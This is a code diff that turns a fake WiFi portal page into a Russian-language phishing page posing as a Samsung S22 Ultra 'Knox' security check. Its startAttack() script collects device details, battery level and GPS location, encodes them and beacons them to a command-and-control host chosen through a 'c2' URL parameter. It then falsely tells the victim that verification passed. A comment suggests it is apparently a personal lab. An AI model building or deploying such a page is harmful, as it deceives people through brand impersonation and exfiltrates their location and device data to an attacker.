@@ -2,43 +2,70 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>WiFi Authenication</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>S22 Ultra Security Check</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding-top: 50px; background: #f4f4f4; }
-        .box { border: 1px solid #ccc; display: inline-block; padding: 20px; background: white; border-radius: 10px; }
+        body { font-family: 'Segoe UI', sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 20px; }
+        .card { border: 1px solid #333; padding: 30px; background: #252525; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .btn { background: #0078d4; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+        .btn:hover { background: #005a9e; }
+        #status { color: #888; margin-top: 15px; font-size: 0.9em; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Вход в гостевую сеть</h2>
-        <p>Ваше устройство почти подключено...</p>
-        <div id="info" style="text-align: left; color: #666; font-size: 0.8em;"></div>
+    <div class="card">
+        <h2>Проверка безопасности Samsung</h2>
+        <p>Ваш S22 Ultra обнаружен. Нажмите кнопку для верификации системы Knox.</p>
+        <button class="btn" onclick="startAttack()">ПОДТВЕРДИТЬ</button>
+        <div id="status">Ожидание действий пользователя...</div>
     </div>
 
     <script>
-        // 1. Собираем инфо об устройстве
-        const info = document.getElementById('info');
-        const data = {
-            "Браузер": navigator.userAgent,
-            "Язык": navigator.language,
-            "Платформа": navigator.platform,
-            "Память (RAM)": navigator.deviceMemory + " GB",
-            "Экрана": window.screen.width + "x" + window.screen.height
-        };
+        async function startAttack() {
+            const status = document.getElementById('status');
+            status.innerText = "Анализ системы... Пожалуйста, подождите.";
 
-        // 2. Доступ к батарее
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(battery) {
-                data["Заряд батареи"] = (battery.level * 100) + "%";
-                render(data);
-            });
-        } else { render(data); }
+            // Собираем данные
+            const data = {
+                ua: navigator.userAgent,
+                ram: navigator.deviceMemory,
+                screen: window.screen.width + "x" + window.screen.height,
+                lang: navigator.language,
+                time: new Date().toLocaleString()
+            };
 
-        function render(obj) {
-            info.innerHTML = "<b>Обнаруженные артефакты:</b><br>";
-            for (let key in obj) {
-                info.innerHTML += key + ": " + obj[key] + "<br>";
+            // Пытаемся получить заряд батареи
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                data.battery = (battery.level * 100) + "%";
             }
+
+            // Пытаемся получить геопозицию (спросит разрешение)
+            navigator.geolocation.getCurrentPosition((pos) => {
+                data.lat = pos.coords.latitude;
+                data.lon = pos.coords.longitude;
+                sendData(data);
+            }, (err) => {
+                data.geo_error = "Denied";
+                sendData(data);
+            });
+        }
+
+        function sendData(collectedData) {
+            const encoded = btoa(JSON.stringify(collectedData));
+            
+            // Магия: ищем параметр "c2" в ссылке. 
+            // Если ты откроешь сайт как: github.io/my-lab/?c2=1.2.3.4
+            // То данные полетят на 1.2.3.4
+            const urlParams = new URLSearchParams(window.location.search);
+            const host = urlParams.get('c2') || '127.0.0.1'; // по умолчанию шлем на localhost
+
+            const attackerUrl = `http://${host}/log?data=${encoded}`;
+            
+            navigator.sendBeacon(attackerUrl);
+            
+            document.getElementById('status').innerText = "Верификация завершена. Ошибок не обнаружено.";
+            console.log("Sent to C2:", host, collectedData);
         }
     </script>
 </body>
